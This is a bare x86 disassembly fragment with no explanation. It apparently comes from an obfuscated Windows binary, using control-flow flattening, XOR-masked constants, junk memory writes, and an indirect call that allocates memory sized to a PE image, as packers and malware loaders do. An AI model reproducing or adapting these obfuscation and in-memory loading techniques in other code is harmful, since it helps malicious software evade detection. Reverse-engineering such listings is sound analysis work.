  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
